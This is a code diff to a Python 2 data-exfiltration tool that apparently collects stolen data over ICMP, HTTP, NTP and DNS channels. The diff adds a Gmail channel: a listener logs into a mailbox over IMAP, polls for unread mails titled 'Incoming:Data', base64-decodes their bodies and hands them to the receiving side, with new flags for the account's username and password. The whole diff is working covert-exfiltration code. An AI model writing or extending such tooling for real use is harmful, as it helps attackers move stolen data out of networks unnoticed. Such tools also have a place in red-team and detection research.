@@ -5,8 +5,14 @@ import hashlib
 import argparse
 import sys
 import string
-import time
 import signal
+import base64
+import imaplib
+from smtplib import SMTP
+from email.MIMEMultipart import MIMEMultipart
+from email.MIMEText import MIMEText
+import email
+import time
 from random import randint
 from os import listdir
 from os.path import isfile, join
@@ -37,20 +43,28 @@ domain = None
 port = None
 register = None
 buf = {}
+gmail_pwd = None
+gmail_user = None
+server = None
+port = None
 
 class Plugin:
 
-    def __init__(self, app, conf, prt, dm):
-        global app_exfiltrate, config, port, domain
+    def __init__(self, app, conf, prt, dm, un, pw):
+        global app_exfiltrate, config, port, domain, gmail_user, gmail_pwd
         app_exfiltrate = app
         config = conf
-	if config == "icmp": 
+	if config == "icmp":
             app.register_plugin('icmp', {'listen': self.icmp_listen})
 	elif config == "http":
 	    port = int(prt)
 	    app.register_plugin('http', {'listen': self.http_listen})
 	elif config == "ntp":
 	    app.register_plugin('ntp', {'listen': self.ntp_listen})
+        elif config == "gmail":
+            gmail_pwd = pw
+            gmail_user = un
+            app.register_plugin('gmail', {'listen': self.gmail_listen})
 	else:
 	    domain = unicode(dm, "utf-8")
 	    app.register_plugin('dns', {'listen': self.dns_listen})
@@ -73,6 +87,43 @@ class Plugin:
     	app_exfiltrate.log_message(
             'info', "[dns] Waiting for DNS packets for domain {0}".format(domain))
     	scapy.sniff(filter="udp and port {}".format(int("53")), prn=self.handle_dns_packet)
+
+
+    def gmail_listen(self):
+        app_exfiltrate.log_message('info', "[gmail] Listening for mails...")
+        client_imap = imaplib.IMAP4_SSL('smtp.gmail.com')
+        try:
+	    client_imap.login(gmail_user,gmail_pwd)
+        except:
+            app_exfiltrate.log_message(
+            'warning', "[gmail] Did not manage to authenticate with creds: {}:{}".format(gmail_user, gmail_pwd))
+            sys.exit(-1)
+
+        while True:
+            client_imap.select("INBOX")
+            typ, id_list = client_imap.uid(
+                'search', None, "(UNSEEN SUBJECT 'Incoming:Data')")
+            for msg_id in id_list[0].split():
+                msg_data = client_imap.uid('fetch', msg_id, '(RFC822)')
+                raw_email = msg_data[1][0][1]
+            # continue inside the same for loop as above
+                raw_email_string = raw_email.decode('utf-8')
+            # converts byte literal to string removing b''
+                email_message = email.message_from_string(raw_email_string)
+            # this will loop through all the available multiparts in mail
+                for part in email_message.walk():
+                    if part.get_content_type() == "text/plain":  # ignore attachments/html
+                        body = part.get_payload(decode=True)
+                        data = body.split('\r\n')[0]
+                    # print data
+                        try:
+                           app_exfiltrate.retrieve_data(base64.b64decode(data))
+                        except Exception, e:
+                           print e
+                    else:
+                        continue
+            time.sleep(2)
+
 
     def ntp_listen(self):
 	global register
@@ -105,7 +156,7 @@ class Plugin:
 				else:
 				    register = register + data.replace("REG-","")
 				    register = filter(lambda x: x in string.printable, register)
-				    app_exfiltrate.retrieve_data(register) 
+				    app_exfiltrate.retrieve_data(register)
 			    else:
 				data = filter(lambda x: x in string.printable, data)
 			    	app_exfiltrate.retrieve_data(data)
@@ -255,7 +306,7 @@ class Exfiltration(object):
         # Load plugins
         sys.path.insert(0, path)
 	for fname in results.type.split(','):
-	    plugins[fname] = Plugin(self, fname, results.port, results.domain)
+	    plugins[fname] = Plugin(self, fname, results.port, results.domain, results.username, results.pwd)
 
     def register_plugin(self, transport_method, functions):
 	self.plugins[transport_method] = functions
@@ -358,6 +409,10 @@ def main():
                         help="Port number to use for HTTP exfiltration (eg. '8080')")
     parser.add_argument('-d', action="store", dest="domain", default=None,
 			help="Domain to use for DNS exfiltration")
+    parser.add_argument('-gu', action="store", dest="username", default=None,
+                        help="Username for gmail exfiltration")
+    parser.add_argument('-gp', action="store", dest="pwd", default=None,
+                        help="Password for gmail exfiltration")
     results = parser.parse_args()
 
     if (results.type is None):
@@ -412,3 +467,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
